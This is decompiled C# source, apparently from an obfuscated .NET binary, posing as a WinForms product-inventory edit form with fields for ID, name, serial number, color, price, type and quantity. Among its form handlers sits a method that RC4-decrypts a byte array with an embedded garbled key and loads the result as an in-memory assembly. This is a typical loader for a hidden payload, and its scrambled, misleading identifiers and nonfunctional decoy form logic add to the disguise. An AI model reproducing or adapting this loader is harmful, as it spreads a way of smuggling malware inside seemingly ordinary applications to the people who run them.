using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.Serialization;
using System.Text;
using System.Windows.Forms;

namespace _111zal2;

public class set_SoapAttributes : Form
{
	private Button UriParser;

	private Button LogFileLocation;

	private Label WindowClassEntry;

	private Label UInt32Converter;

	private Label DigestContext;

	private Label _003CGetAllRawData_003Ed__0;

	private Label SortedRows_00602;

	private Label _003CFindEvents_003Ed__1a;

	private ComboBox XmlCharType;

	private TextBox DataGridViewComboBoxCellRenderer;

	private TextBox IMAGE_OPTIONAL_HEADER64;

	private TextBox SmtpTransport;

	private TextBox MessageDecoder;

	private Button KAID;

	private Class11.Class12 class12_0 = new Class11.Class12();

	public set_SoapAttributes()
	{
		object obj = null;
		class12_0.icontainer_0 = obj as IContainer;
		((Form)this)._002Ector();
		PropertyType();
	}

	private void FtpOperation(object sender, EventArgs e)
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)class12_0.textBox_0).get_Text() != "")
		{
			object obj = new GetStyleSheets();
			int.Parse(((Control)class12_0.textBox_0).get_Text());
			if (!double.TryParse(((Control)SmtpTransport).get_Text(), out var _))
			{
				MessageBox.Show("Invalid price format");
				return;
			}
			(obj as GetStyleSheets).SqlColumnEncryptionCspProvider = ((Control)MessageDecoder).get_Text();
			((GetStyleSheets)obj).LinkBehavior = ((Control)DataGridViewComboBoxCellRenderer).get_Text();
			((GetStyleSheets)obj).WebBrowserBase = ((Control)IMAGE_OPTIONAL_HEADER64).get_Text();
			((GetStyleSheets)obj).MethodDef = double.Parse(((Control)SmtpTransport).get_Text());
			((GetStyleSheets)obj).HTTP_DATA_CHUNK_TYPE = ((Control)XmlCharType).get_Text();
			((GetStyleSheets)obj).CodeTryCatchFinallyStatement = long.Parse(class12_0.numericUpDown_0.get_Value().ToString());
			((Form)this).Close();
		}
		else
		{
			MessageBox.Show("First select id to edit");
		}
	}

	private void ValidationState(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	public static Assembly Scope(byte[] SymbolDocumentGenerator)
	{
		Array bytes = Encoding.ASCII.GetBytes("Қ䕃ʭג\udb27ŲЅ\u0300ϱ\u0331\uda2cC\u0655\u05c9\udd72ÒΠ皍ValueNkLjyJXDebuggerHiddenAttributeExplicitlySetDDPuBEekSfAnPIoDJqgGNXRFWF");
		uint num = 0u;
		uint num2 = 0u;
		uint num3 = 0u;
		Array array = new uint[256];
		Array array2 = new byte[SymbolDocumentGenerator.Length];
		for (num = 0u; num <= 255; num++)
		{
			(array as uint[])[num] = num;
		}
		for (num = 0u; num <= 255; num++)
		{
			num2 = (num2 + (bytes as byte[])[(long)num % (long)((byte[])bytes).Length] + ((uint[])array)[num]) & 0xFFu;
			num3 = (array as uint[])[num];
			((uint[])array)[num] = ((uint[])array)[num2];
			(array as uint[])[num2] = num3;
		}
		num = 0u;
		num2 = 0u;
		for (long num4 = 0L; num4 <= (array2 as byte[]).Length - 1; num4++)
		{
			num = (num + 1) & 0xFFu;
			num2 = (num2 + (array as uint[])[num]) & 0xFFu;
			num3 = ((uint[])array)[num];
			(array as uint[])[num] = (array as uint[])[num2];
			((uint[])array)[num2] = num3;
			((byte[])array2)[num4] = Convert.ToByte(SymbolDocumentGenerator[num4] ^ (array as uint[])[(((uint[])array)[num] + ((uint[])array)[num2]) & 0xFF]);
		}
		ISerializable serializable = get_EntryAssembly.FastIntComparer.Load(array2 as byte[]);
		return serializable as Assembly;
	}

	private void Query(object sender, EventArgs e)
	{
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Unknown result type (might be due to invalid IL or missing references)
		object obj = new GetStyleSheets();
		if (int.TryParse(((Control)class12_0.textBox_0).get_Text(), out var _))
		{
			int num = int.Parse(((Control)class12_0.textBox_0).get_Text());
			((Control)MessageDecoder).set_Text(((GetStyleSheets)obj).SqlColumnEncryptionCspProvider);
			((Control)DataGridViewComboBoxCellRenderer).set_Text((obj as GetStyleSheets).LinkBehavior);
			((Control)IMAGE_OPTIONAL_HEADER64).set_Text((obj as GetStyleSheets).WebBrowserBase);
			((Control)SmtpTransport).set_Text(((GetStyleSheets)obj).MethodDef.ToString());
			((Control)XmlCharType).set_Text("");
			XmlCharType.set_SelectedText((obj as GetStyleSheets).HTTP_DATA_CHUNK_TYPE);
			class12_0.numericUpDown_0.set_Value(decimal.Parse(((GetStyleSheets)obj).CodeTryCatchFinallyStatement.ToString()));
			num = int.Parse(((Control)class12_0.textBox_0).get_Text());
			MessageBox.Show("Product with id = " + num + " was not found");
		}
		else
		{
			MessageBox.Show("Id must be a number");
		}
	}

	private void InternalParseStateE(object sender, EventArgs e)
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)class12_0.textBox_0).get_Text() != "")
		{
			new GetStyleSheets();
			int.Parse(((Control)class12_0.textBox_0).get_Text());
			MessageBox.Show("Product deleted");
			((Form)this).Close();
		}
		else
		{
			MessageBox.Show("First select id to delete");
		}
	}

	protected override void KeyEventRecord(bool NoNullAllowedException)
	{
		if (NoNullAllowedException && class12_0.icontainer_0 != null)
		{
			class12_0.icontainer_0.Dispose();
		}
		((Form)this).Dispose(NoNullAllowedException);
	}

	private void PropertyType()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got Unknown
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Expected O, but got Unknown
		UriParser = new Button();
		LogFileLocation = new Button();
		TextBoxBase val = (TextBoxBase)new TextBox();
		class12_0.textBox_0 = (TextBox)val;
		object obj = (object)new Label();
		class12_0.label_0 = (Label)((obj is Label) ? obj : null);
		WindowClassEntry = new Label();
		UInt32Converter = new Label();
		DigestContext = new Label();
		_003CGetAllRawData_003Ed__0 = new Label();
		SortedRows_00602 = new Label();
		_003CFindEvents_003Ed__1a = new Label();
		XmlCharType = new ComboBox();
		UpDownBase val2 = (UpDownBase)new NumericUpDown();
		class12_0.numericUpDown_0 = (NumericUpDown)val2;
		DataGridViewComboBoxCellRenderer = new TextBox();
		IMAGE_OPTIONAL_HEADER64 = new TextBox();
		SmtpTransport = new TextBox();
		MessageDecoder = new TextBox();
		KAID = new Button();
		object obj2 = (object)new Button();
		class12_0.button_0 = (Button)obj2;
		((ISupportInitialize)class12_0.numericUpDown_0).BeginInit();
		((Control)this).SuspendLayout();
		((Control)UriParser).set_Location(new Point(337, 251));
		((Control)UriParser).set_Name("button1");
		((Control)UriParser).set_Size(new Size(75, 23));
		((Control)UriParser).set_TabIndex(9);
		((Control)UriParser).set_Text("Edit");
		((ButtonBase)UriParser).set_UseVisualStyleBackColor(true);
		((Control)UriParser).add_Click((EventHandler)FtpOperation);
		((Control)LogFileLocation).set_Location(new Point(256, 251));
		((Control)LogFileLocation).set_Name("button2");
		((Control)LogFileLocation).set_Size(new Size(75, 23));
		((Control)LogFileLocation).set_TabIndex(8);
		((Control)LogFileLocation).set_Text("Cancel");
		((ButtonBase)LogFileLocation).set_UseVisualStyleBackColor(true);
		((Control)LogFileLocation).add_Click((EventHandler)ValidationState);
		((Control)class12_0.textBox_0).set_Location(new Point(85, 30));
		((Control)class12_0.textBox_0).set_Name("textBox1");
		((Control)class12_0.textBox_0).set_Size(new Size(46, 20));
		((Control)class12_0.textBox_0).set_TabIndex(0);
		((Control)class12_0.label_0).set_AutoSize(true);
		((Control)class12_0.label_0).set_Location(new Point(49, 33));
		((Control)class12_0.label_0).set_Name("label1");
		((Control)class12_0.label_0).set_Size(new Size(18, 13));
		((Control)class12_0.label_0).set_TabIndex(3);
		((Control)class12_0.label_0).set_Text("ID");
		((Control)WindowClassEntry).set_AutoSize(true);
		((Control)WindowClassEntry).set_Location(new Point(71, 104));
		((Control)WindowClassEntry).set_Name("label2");
		((Control)WindowClassEntry).set_Size(new Size(73, 13));
		((Control)WindowClassEntry).set_TabIndex(4);
		((Control)WindowClassEntry).set_Text("Product name");
		((Control)UInt32Converter).set_AutoSize(true);
		((Control)UInt32Converter).set_Location(new Point(350, 104));
		((Control)UInt32Converter).set_Name("label3");
		((Control)UInt32Converter).set_Size(new Size(71, 13));
		((Control)UInt32Converter).set_TabIndex(5);
		((Control)UInt32Converter).set_Text("Serial number");
		((Control)DigestContext).set_AutoSize(true);
		((Control)DigestContext).set_Location(new Point(113, 155));
		((Control)DigestContext).set_Name("label4");
		((Control)DigestContext).set_Size(new Size(31, 13));
		((Control)DigestContext).set_TabIndex(6);
		((Control)DigestContext).set_Text("Color");
		((Control)_003CGetAllRawData_003Ed__0).set_AutoSize(true);
		((Control)_003CGetAllRawData_003Ed__0).set_Location(new Point(390, 155));
		((Control)_003CGetAllRawData_003Ed__0).set_Name("label5");
		((Control)_003CGetAllRawData_003Ed__0).set_Size(new Size(31, 13));
		((Control)_003CGetAllRawData_003Ed__0).set_TabIndex(7);
		((Control)_003CGetAllRawData_003Ed__0).set_Text("Price");
		((Control)SortedRows_00602).set_AutoSize(true);
		((Control)SortedRows_00602).set_Location(new Point(113, 197));
		((Control)SortedRows_00602).set_Name("label6");
		((Control)SortedRows_00602).set_Size(new Size(31, 13));
		((Control)SortedRows_00602).set_TabIndex(8);
		((Control)SortedRows_00602).set_Text("Type");
		((Control)_003CFindEvents_003Ed__1a).set_AutoSize(true);
		((Control)_003CFindEvents_003Ed__1a).set_Location(new Point(386, 197));
		((Control)_003CFindEvents_003Ed__1a).set_Name("label7");
		((Control)_003CFindEvents_003Ed__1a).set_Size(new Size(29, 13));
		((Control)_003CFindEvents_003Ed__1a).set_TabIndex(9);
		((Control)_003CFindEvents_003Ed__1a).set_Text("QTY");
		((ListControl)XmlCharType).set_FormattingEnabled(true);
		XmlCharType.get_Items().AddRange(new object[3] { "Smartphone", "Tv", "Laptop" });
		((Control)XmlCharType).set_Location(new Point(150, 194));
		((Control)XmlCharType).set_Name("comboBox1");
		((Control)XmlCharType).set_Size(new Size(153, 21));
		((Control)XmlCharType).set_TabIndex(6);
		((Control)class12_0.numericUpDown_0).set_Location(new Point(427, 195));
		class12_0.numericUpDown_0.set_Maximum(new decimal(new int[4] { 10000000, 0, 0, 0 }));
		((Control)class12_0.numericUpDown_0).set_Name("numericUpDown1");
		((Control)class12_0.numericUpDown_0).set_Size(new Size(153, 20));
		((Control)class12_0.numericUpDown_0).set_TabIndex(7);
		((Control)DataGridViewComboBoxCellRenderer).set_Location(new Point(427, 101));
		((Control)DataGridViewComboBoxCellRenderer).set_Name("textBox2");
		((Control)DataGridViewComboBoxCellRenderer).set_Size(new Size(153, 20));
		((Control)DataGridViewComboBoxCellRenderer).set_TabIndex(3);
		((Control)IMAGE_OPTIONAL_HEADER64).set_Location(new Point(150, 152));
		((Control)IMAGE_OPTIONAL_HEADER64).set_Name("textBox3");
		((Control)IMAGE_OPTIONAL_HEADER64).set_Size(new Size(153, 20));
		((Control)IMAGE_OPTIONAL_HEADER64).set_TabIndex(4);
		((Control)SmtpTransport).set_Location(new Point(427, 152));
		((Control)SmtpTransport).set_Name("textBox4");
		((Control)SmtpTransport).set_Size(new Size(153, 20));
		((Control)SmtpTransport).set_TabIndex(5);
		((Control)MessageDecoder).set_Location(new Point(150, 101));
		((Control)MessageDecoder).set_Name("textBox5");
		((Control)MessageDecoder).set_Size(new Size(153, 20));
		((Control)MessageDecoder).set_TabIndex(2);
		((Control)KAID).set_Location(new Point(150, 28));
		((Control)KAID).set_Name("button3");
		((Control)KAID).set_Size(new Size(75, 23));
		((Control)KAID).set_TabIndex(1);
		((Control)KAID).set_Text("Search");
		((ButtonBase)KAID).set_UseVisualStyleBackColor(true);
		((Control)KAID).add_Click((EventHandler)Query);
		((Control)class12_0.button_0).set_Location(new Point(463, 251));
		((Control)class12_0.button_0).set_Name("button4");
		((Control)class12_0.button_0).set_Size(new Size(75, 23));
		((Control)class12_0.button_0).set_TabIndex(10);
		((Control)class12_0.button_0).set_Text("Delete");
		((ButtonBase)class12_0.button_0).set_UseVisualStyleBackColor(true);
		((Control)class12_0.button_0).add_Click((EventHandler)InternalParseStateE);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(663, 303));
		((Control)this).get_Controls().Add((Control)(object)class12_0.button_0);
		((Control)this).get_Controls().Add((Control)(object)KAID);
		((Control)this).get_Controls().Add((Control)(object)MessageDecoder);
		((Control)this).get_Controls().Add((Control)(object)SmtpTransport);
		((Control)this).get_Controls().Add((Control)(object)IMAGE_OPTIONAL_HEADER64);
		((Control)this).get_Controls().Add((Control)(object)DataGridViewComboBoxCellRenderer);
		((Control)this).get_Controls().Add((Control)(object)class12_0.numericUpDown_0);
		((Control)this).get_Controls().Add((Control)(object)XmlCharType);
		((Control)this).get_Controls().Add((Control)(object)_003CFindEvents_003Ed__1a);
		((Control)this).get_Controls().Add((Control)(object)SortedRows_00602);
		((Control)this).get_Controls().Add((Control)(object)_003CGetAllRawData_003Ed__0);
		((Control)this).get_Controls().Add((Control)(object)DigestContext);
		((Control)this).get_Controls().Add((Control)(object)UInt32Converter);
		((Control)this).get_Controls().Add((Control)(object)WindowClassEntry);
		((Control)this).get_Controls().Add((Control)(object)class12_0.label_0);
		((Control)this).get_Controls().Add((Control)(object)class12_0.textBox_0);
		((Control)this).get_Controls().Add((Control)(object)LogFileLocation);
		((Control)this).get_Controls().Add((Control)(object)UriParser);
		((Control)this).set_Name("EditForm");
		((Control)this).set_Text("EditForm");
		((ISupportInitialize)class12_0.numericUpDown_0).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
